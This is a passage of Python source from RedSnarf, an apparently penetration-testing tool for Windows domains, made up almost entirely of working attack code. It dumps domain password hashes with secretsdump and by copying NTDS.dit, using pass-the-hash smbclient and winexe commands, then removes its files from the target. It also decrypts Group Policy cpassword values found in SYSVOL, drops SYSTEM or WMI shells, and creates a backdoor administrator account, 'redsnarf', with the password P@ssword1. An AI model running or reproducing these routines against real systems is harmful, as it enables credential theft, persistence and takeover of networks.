		print colored ('\n[-]It is only possible to use this technique on a single target and not a range','red')
		sys.exit()

if drsuapi in yesanswers:
	if len(targets)==1:
		try:
			checkport()

			if not os.path.isfile('/usr/local/bin/secretsdump.py'):
				print colored("[-]No secretsdump.py",'red')
				print colored("[-]Clone from https://github.com/CoreSecurity/impacket.git",'yellow')
				print colored("[-]and run: python setup.py install",'yellow')
				exit(1)				
			else:
				print colored("[+]Found secretsdump",'green')
			if not os.path.isdir(outputpath+targets[0]):
				os.makedirs(outputpath+targets[0])
				print colored("[+]Creating directory for host: "+outputpath+targets[0],'green')
			else:
				print colored("[+]Found directory for: "+outputpath+targets[0],'green')
			
			if os.path.isfile(outputpath+targets[0]+'/drsuapi_gethashes.txt'):
				print colored("\n[+]WARNING",'red')
				response = raw_input("Looks like you have an existing file "+outputpath+targets[0]+'/drsuapi_gethashes.txt'+", do you want to overwrite?: Y/(N) ")
				if response in yesanswers:	

					print colored("[+]Saving hashes to: "+outputpath+targets[0]+'/drsuapi_gethashes.txt','yellow')
					pwdumpmatch = re.compile('^([0-9a-fA-F]{32}):([0-9a-fA-F]{32}):.*?:.*?:\s*$')
					pwdump = pwdumpmatch.match(passw)
			
					response = raw_input("Do you want to extract hashes with history?: Y/(N) ")
					if response in yesanswers:		
						if pwdump:
							os.system("/usr/local/bin/secretsdump.py -history -hashes "+passw+' '+domain_name+'/'+user+'\\'+'@'+targets[0] +'> '+outputpath+targets[0]+'/drsuapi_gethashes.txt')
						else:
							os.system("/usr/local/bin/secretsdump.py -history "+domain_name+'/'+user+':'+passw+'\\'+'@'+targets[0] +'> '+outputpath+targets[0]+'/drsuapi_gethashes.txt')
					
						if os.path.isfile(outputpath+targets[0]+"/drsuapi_gethashes.txt"):
							print colored("[+]Found file - completed : "+outputpath+targets[0]+"/drsuapi_gethashes.txt",'green')
						else:
							print colored("[-]File not Found - Failed : "+outputpath+targets[0]+"/drsuapi_gethashes.txt",'red')
					else:
						if pwdump:
							os.system("/usr/local/bin/secretsdump.py -hashes "+passw+' '+domain_name+'/'+user+'\\'+'@'+targets[0] +'> '+outputpath+targets[0]+'/drsuapi_gethashes.txt')
						else:
							os.system("/usr/local/bin/secretsdump.py "+domain_name+'/'+user+':'+passw+'\\'+'@'+targets[0] +'> '+outputpath+targets[0]+'/drsuapi_gethashes.txt')

						if os.path.isfile(outputpath+targets[0]+"/drsuapi_gethashes.txt"):
							print colored("[+]Found file - completed : "+outputpath+targets[0],'green')
							hashparse(outputpath+targets[0],'/drsuapi_gethashes.txt')
					
							if qldap in yesanswers:
								print colored("[+]Checking LM User Account Status",'yellow')
								userstatus(outputpath,targets[0],'lm_usernames.txt')
								print colored("[+]Checking NT User Account Status",'yellow')
								userstatus(outputpath,targets[0],'nt_usernames.txt')
					
							if os.path.isfile(outputpath+targets[0]+"/nt.txt"):
								response = raw_input("Do you want to starting cracking the NT hashes with John The Ripper?: Y/(N) ")
								if response in yesanswers:	
									quickjtr(outputpath+targets[0]+"/nt.txt")

					sys.exit()
		
				else:
					sys.exit()
			else:
				print colored("[+]Saving hashes to: "+outputpath+targets[0]+'/drsuapi_gethashes.txt','yellow')
				pwdumpmatch = re.compile('^([0-9a-fA-F]{32}):([0-9a-fA-F]{32}):.*?:.*?:\s*$')
				pwdump = pwdumpmatch.match(passw)
			
				if pwdump:
					passw=passw[0:-3]

				response = raw_input("Do you want to extract hashes with history?: Y/(N) ")
				if response in yesanswers:		
					if pwdump:
						os.system("/usr/local/bin/secretsdump.py -history -hashes "+passw+' '+domain_name+'/'+user+'\\'+'@'+targets[0] +'> '+outputpath+targets[0]+'/drsuapi_gethashes.txt')
					else:
						os.system("/usr/local/bin/secretsdump.py -history "+domain_name+'/'+user+':'+passw+'\\'+'@'+targets[0] +'> '+outputpath+targets[0]+'/drsuapi_gethashes.txt')
				
					if os.path.isfile(outputpath+targets[0]+"/drsuapi_gethashes.txt"):
						print colored("[+]Found file - completed : "+outputpath+targets[0]+"/drsuapi_gethashes.txt",'green')
					else:
						print colored("[-]File not Found - Failed : "+outputpath+targets[0]+"/drsuapi_gethashes.txt",'red')
				else:
					if pwdump:
						os.system("/usr/local/bin/secretsdump.py -hashes "+passw+' '+domain_name+'/'+user+'\\'+'@'+targets[0] +'> '+outputpath+targets[0]+'/drsuapi_gethashes.txt')
					else:
						os.system("/usr/local/bin/secretsdump.py "+domain_name+'/'+user+':'+passw+'\\'+'@'+targets[0] +'> '+outputpath+targets[0]+'/drsuapi_gethashes.txt')

					if os.path.isfile(outputpath+targets[0]+"/drsuapi_gethashes.txt"):
						print colored("[+]Found file - completed : "+outputpath+targets[0],'green')
						hashparse(outputpath+targets[0],'/drsuapi_gethashes.txt')
				
						if qldap in yesanswers:
							print colored("[+]Checking LM User Account Status",'yellow')
							userstatus(outputpath,targets[0],'lm_usernames.txt')
							print colored("[+]Checking NT User Account Status",'yellow')
							userstatus(outputpath,targets[0],'nt_usernames.txt')
				
						if os.path.isfile(outputpath+targets[0]+"/nt.txt"):
							response = raw_input("Do you want to starting cracking the NT hashes with John The Ripper?: Y/(N) ")
							if response in yesanswers:	
								quickjtr(outputpath+targets[0]+"/nt.txt")
				sys.exit()
		
		except OSError:
			print colored("[-]Something went wrong using the drsuapi method",'red')
	else:
		print colored ('\n[-]It is only possible to use this technique on a single target and not a range','red')
		sys.exit()

if ntds_util in yesanswers or ntds_util=="d":
	#Currently undocumented function - creates a bat file which can be copied and pasted to the remote machine if the process can't be fully automated
	if ntds_util=='d':
		print colored("[+]Writing NTDS.dit dropper to /tmp/ntds.bat",'green')
		print colored("[+]Copy this file via RDP to the remote machine then run it, then copy the c:\\redsnarf folder back to this machine",'yellow')
		pscommand="ntdsutil.exe \"ac i ntds\" \"ifm\" \"create full c:\\redsnarf\" q q"
		fout=open('/tmp/ntds.bat','w')
		fout.write('@echo off\n')
		fout.write(pscommand)
		fout.close() 

		sys.exit()

	#Normal fully automated functionality starts here
	if len(targets)==1:
		try:
			checkport()

			if not os.path.isfile('/usr/local/bin/secretsdump.py'):
				print colored("[-]No secretsdump.py",'red')
				print colored("[-]Clone from https://github.com/CoreSecurity/impacket.git",'yellow')
				print colored("[-]and run: python setup.py install",'yellow')
				exit(1)				
			else:
				print colored("[+]Found secretsdump",'green')
			if not os.path.isdir(outputpath+targets[0]):
				os.makedirs(outputpath+targets[0])
				print colored("[+]Creating directory for host: "+outputpath+targets[0],'green')
			else:
				print colored("[+]Found directory for : "+outputpath+targets[0],'green')
			print colored("[+]Attempting to grab a copy of NTDS.dit using NTDSUtil",'green')
			pscommand="ntdsutil.exe \"ac i ntds\" \"ifm\" \"create full c:\\redsnarf\" q q"
			fout=open('/tmp/ntds.bat','w')
			fout.write('@echo off\n')
			fout.write(pscommand)
			fout.close() 
			os.system("/usr/bin/pth-smbclient //"+targets[0]+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd /tmp; put ntds.bat\' 2>/dev/null")
			os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" \"cmd.exe /C c:\\ntds.bat\" 2>/dev/null")
			os.system("/usr/bin/pth-smbclient //"+targets[0]+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+outputpath+targets[0]+"; cd redsnarf; recurse; prompt off; mget registry; exit' 2>/dev/null")
			os.system("/usr/bin/pth-smbclient //"+targets[0]+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+outputpath+targets[0]+"; cd redsnarf; recurse; prompt off; mget \"Active Directory\"; exit' 2>/dev/null")
			os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" \"cmd.exe /C rd /s /q c:\\redsnarf\" 2>/dev/null")
			os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" \"cmd.exe /C del c:\\ntds.bat\" 2>/dev/null") 
			if os.path.isfile(outputpath+targets[0]+'/registry/SYSTEM') and os.path.isfile(outputpath+targets[0]+'/Active Directory/ntds.dit'):	
				print colored("[+]Found SYSTEM and ntds.dit",'green')
				print colored("[+]Extracting Hash Database to "+outputpath+targets[0]+'/redsnarf ' +"be patient this may take a minute or two...",'yellow')

				response = raw_input("Do you want to extract hashes with history?: Y/(N) ")
				if response in yesanswers:		
					print colored("[+]Gathering hash history...",'yellow')	
							
					os.system("/usr/local/bin/secretsdump.py -just-dc-ntlm -history -system "+outputpath+targets[0]+'/registry/SYSTEM '+ "-ntds "+outputpath+targets[0]+"/Active\ Directory/ntds.dit" +" -outputfile "+outputpath+targets[0]+"/hashhistoryhashdump.txt local")
					if os.path.isfile(outputpath+targets[0]+'/hashhistoryhashdump.txt.ntds'):
						print colored("[+]Hashes successfully output to "+outputpath+targets[0]+'/hashhistoryhashdump.txt.ntds','green')
					else:
						print colored('[-]Somthing went wrong extracting hash history','red')
				else:	
					os.system("/usr/local/bin/secretsdump.py -just-dc-ntlm -system "+outputpath+targets[0]+'/registry/SYSTEM '+ "-ntds "+outputpath+targets[0]+"/Active\ Directory/ntds.dit" +" -outputfile "+outputpath+targets[0]+"/hashdump.txt local")
					if os.path.isfile(outputpath+targets[0]+'/hashdump.txt.ntds'):
						print colored("[+]Hashes successfully output to "+outputpath+targets[0]+'/hashdump.txt.ntds','green')
					else:
						print colored('[-]Somthing went wrong extracting hashes','red')								
				
					#Parse hashes into LM and NT ready for cracking
					if os.path.isfile(outputpath+targets[0]+'/hashdump.txt.ntds'):
						print colored("[+]Parsing gathered hashes "+outputpath+targets[0]+'/hashdump.txt.ntds','green')
						hashparse(outputpath+targets[0],'/hashdump.txt.ntds')
						#See if we want some extra information about users.
						if qldap in yesanswers:
							print colored("[+]Checking LM User Account Status",'yellow')
							userstatus(outputpath,targets[0],'lm_usernames.txt')
							print colored("[+]Checking NT User Account Status",'yellow')
							userstatus(outputpath,targets[0],'nt_usernames.txt')

						if os.path.isfile(outputpath+targets[0]+"/nt.txt"):
							response = raw_input("Do you want to starting cracking the NT hashes with John The Ripper?: Y/(N) ")
							if response in yesanswers:	
								quickjtr(outputpath+targets[0]+"/nt.txt")
			else:
				print colored("[-]missing SYSTEM and ntds.dit",'red')
			sys.exit()		
		except OSError:
			print colored("[-]Something went wrong dumping NTDS.dit",'red')
	else:
		print colored ('\n[-]It is only possible to use this technique on a single target and not a range','red')
		sys.exit()

if policiesscripts_dump in yesanswers:
	if len(targets)==1:
		if user!='' and passw!='' and targets[0]!='':
			
			checkport()

			print colored("[+]Attempting to download contents of Policies and Scripts from sysvol and search for administrator and password:",'yellow')

			if not os.path.isdir(outputpath+targets[0]):
				os.makedirs(outputpath+targets[0])
				print colored("[+]Creating directory for host: "+outputpath+targets[0],'green')
			else:
				print colored("[+]Found directory for : "+outputpath+targets[0],'green')
			if os.path.isdir(outputpath+targets[0]):
				print colored("[+]Attempting to download policies folder from /sysvol",'green')		
				os.system("/usr/bin/pth-smbclient //"+targets[0]+"/SYSVOL -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+outputpath+targets[0]+"; cd "+domain_name+"; recurse; prompt off; mget policies; exit' 2>/dev/null")
				print colored("[+]Attempting to download scripts folder from /sysvol",'green')	
				os.system("/usr/bin/pth-smbclient //"+targets[0]+"/SYSVOL -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+outputpath+targets[0]+"; cd "+domain_name+"; recurse; prompt off; mget scripts; exit' 2>/dev/null")
								
				if os.path.isdir(outputpath+targets[0]+'/Policies/'):
					print colored("[+]Attempting to to find references to administrator and password in "+outputpath+targets[0]+'/Policies/','green')	
					os.chdir(outputpath+targets[0]+'/Policies/')
					os.system("pwd")
					os.system("grep --color='auto' -ri administrator")
					os.system("grep --color='auto' -ri password")
					
					print colored("[+]Attempting to to find references for cpassword in "+outputpath+targets[0]+'/Policies/','green')
					#Grep cpassword entries out to file
					os.system("grep --exclude=cpassword.txt -ri \"cpassword\" > cpassword.txt")
					#Check to see if cpassword file has been created
					if os.path.isfile(outputpath+targets[0]+'/Policies/cpassword.txt') and os.stat(outputpath+targets[0]+'/Policies/cpassword.txt').st_size >0:
						#If file is available parse it
						print colored("[+]Excellent we have found cpassword in Policies... "+outputpath+targets[0]+'/Policies/','green')
						print colored("[+]Items containing cpassword have been output to "+outputpath+targets[0]+'/Policies/cpassword.txt','blue')
						try:
							u = open(outputpath+targets[0]+'/Policies/cpassword.txt').read().splitlines()
							
							for n in u:
								
								#Try and filter for blank cpassword - cpassword=""
								z=n.find("cpassword")
								z=z+11
								#If cpassword isn't blank continue
								if n[z:]!="\"":
									b=n.find("cpassword")
								
									if b>0:
										b=b+11
										c=n.find("\"",int(b))
									
									if b>0 and c>0:
										d=n[int(b):int(c)]
									
									if len(d)>0:
										print colored("[+]Attemping to decrypt cpassword - "+d,'yellow')
										gppdecrypt(d) 

						except IOError as e:
							print "I/O error({0}): {1}".format(e.errno, e.strerror) 

				if os.path.isdir(outputpath+targets[0]+'/scripts/'):
					print colored("[+]Attempting to to find references to administrator and password in "+outputpath+targets[0]+'/scripts/','green')	
					os.chdir(outputpath+targets[0]+'/scripts/')
					os.system("pwd")
					#os.system("grep --color='auto' -ri net user")
					os.system("grep --exclude=netuser.txt -ri \"net user\" > netuser.txt")
					os.system("grep --color='auto' -ri administrator")
					os.system("grep --color='auto' -ri password")
					os.system("grep --color='auto' -ri pwd")
					os.system("grep --color='auto' -ri runas")

					if os.path.isfile(outputpath+targets[0]+'/scripts/netuser.txt') and os.stat(outputpath+targets[0]+'/scripts/netuser.txt').st_size >0:
							#If file is available parse it
						print colored("[+]Excellent we have found \'net user\' in scripts... "+outputpath+targets[0]+'/scripts/','green')
						print colored("[+]Items containing net user have been output to "+outputpath+targets[0]+'/scripts/netuser.txt','blue')
						print colored("[+]Looking for Account creation in scripts.",'yellow')
						try:
							u = open(outputpath+targets[0]+'/scripts/netuser.txt').read().splitlines()
						
							for n in u:
								#Check the line for net user /add which indicates an account being created
								if n.find("net user"):									
									if n.find("/add"):
										print colored(n,'red')
						except:
							print "Failed"

				sys.exit()
		else:
			print colored ('[-]Something has gone wrong check your parameters!, Try --help for a list of parameters','red')
			print colored ('[-]Usage - ./redsnarf.py -H 10.0.0.1 -u username -p password -P y -D domain','yellow')
			sys.exit()
	else:
		print colored ('\n[-]It is only possible to use this technique on a single target and not a range','red')
		sys.exit()

if system_tasklist in yesanswers:
	if len(targets)==1:
		try:
			print colored ('\n[+] Getting NT AUTHORITY\SYSTEM Tasklist on '+targets[0]+'\n','yellow')
			proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd.exe /C TASKLIST /FI \"USERNAME ne NT AUTHORITY\SYSTEM\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
			print proc.communicate()[0]			
			sys.exit()
		except:
			sys.exit()
	else:
		print colored ('\n[-]It is only possible to drop a shell on a single target and not a range','red')
		sys.exit()

if dropshell in yesanswers:
	if len(targets)==1:
		try:
			if passw=="":
				print colored ('\n[+] Dropping WMI Based Shell on '+targets[0]+'\n','yellow')
				os.system("wmiexec.py "+user+"@"+targets[0]+" -no-pass 2>/dev/null")
				sys.exit()
			else:				
				response = raw_input("Would you like a shell with SYSTEM Privileges?: Y/(N) ")
				if response in yesanswers:	
					print colored ('\n[+] Dropping a SYSTEM Shell on '+targets[0]+'\n','yellow')
					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" \"cmd.exe\" 2>/dev/null")
					sys.exit()
				#Undocumented option
				elif response=="w":
					print colored ('\n[+] Dropping WMI Based Shell on '+targets[0]+'\n','yellow')
					os.system("wmiexec.py "+user+":"+passw+"@"+targets[0]+" 2>/dev/null")
					sys.exit()
				#Undocumented option
				elif response=="a":
					print colored ('\n[+] Dropping a SHELL based on New Account Details '+targets[0]+'\n','yellow')
					print colored ("Adding a new account with the credentials username=redsnarf password=P@ssword1",'green')
					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall \/\/"+targets[0]+" \"cmd.exe /c net user redsnarf P@ssword1 /ADD && net localgroup Administrators redsnarf /ADD\" 2>/dev/null")
					print colored ("Dropping a shell with the account redsnarf and password P@ssword1",'green')
					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+"redsnarf"+"%"+"P@ssword1"+"\" --uninstall \/\/"+targets[0]+" \"cmd.exe\" 2>/dev/null")
					sys.exit()
				else:
					print colored ('\n[+] Dropping Shell on '+targets[0]+'\n','yellow')
					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall \/\/"+targets[0]+" \"cmd.exe\" 2>/dev/null")
					sys.exit()

		except:
			sys.exit()
	else:
		print colored ('\n[-]It is only possible to drop a shell on a single target and not a range','red')
		sys.exit()

if ofind_user !='n':
	if "file=" in ofind_user:
		print colored("[+]Search cached logged_on_users.txt files for users",'yellow')
		userfilename = ofind_user[5:]
		if len(userfilename)==0:
			print colored("[-]I think you forgot the filename...",'red')
			sys.exit()
		else:
						
			if os.path.isfile(userfilename):
				print colored("[+]Confirmed that "+userfilename+ " exists...",'green')
			else:
				print colored("[-]Unable to confirm that "+userfilename+" exists",'red')
				sys.exit()

			print colored("[+]Searching for users in file "+userfilename,'yellow')

		for ip in targets:
			if os.path.isfile(outputpath+str(ip)+'/logged_on_users.txt'):
				usernamesfile = open(userfilename, 'r')
				for usern in usernamesfile:
					if usern.rstrip() in open(outputpath+str(ip)+'/logged_on_users.txt').read():
						print colored ("[+]Found " + usern.rstrip() + " logged in to "+str(ip),'green')

	else:
		print colored ('\n[+]Now looking for where user '+ofind_user+' is logged in','yellow')
		for ip in targets:
			if os.path.isfile(outputpath+str(ip)+'/logged_on_users.txt'):
				if ofind_user in open(outputpath+str(ip)+'/logged_on_users.txt').read():
					print colored ("[+]Found " + ofind_user + " logged in to "+str(ip),'green')
	
	sys.exit()

if user_desc in yesanswers:
	if len(targets)==1:
		try:
			#Check that we're running this against a DC
			checkport()
			
			if not os.path.isdir(outputpath+targets[0]):
				os.makedirs(outputpath+targets[0])
				print colored("[+]Creating directory for host: "+outputpath+targets[0],'green')
			else:
				print colored("[+]Found directory for : "+outputpath+targets[0],'yellow')
			
			print colored("[+]Attempting to gather AD Description information using RPC",'green')
			
			enumdomusers(targets[0],user,passw,outputpath+targets[0]+"/")
			getdescfield(targets[0],user,passw,outputpath+targets[0]+"/")

			sys.exit()

		except:
			sys.exit()
	else:
		print colored ('\n[-]It is only possible to use this function on a single target and not a range','red')
		sys.exit()



if targets is None:
	print colored ('[-]You have not entered a target!, Try --help for a list of parameters','red')
	sys.exit()

syschecks()

if __name__ == '__main__':
	signal.signal(signal.SIGINT, signal_handler)
	main()
	now = time.strftime("%c")
	
	print colored("[+]Scan Stop " + time.strftime("%c"),'blue')
	print colored("[+]end - check redsnarf.log for log related information",'green')
	logging.info("[+]end")
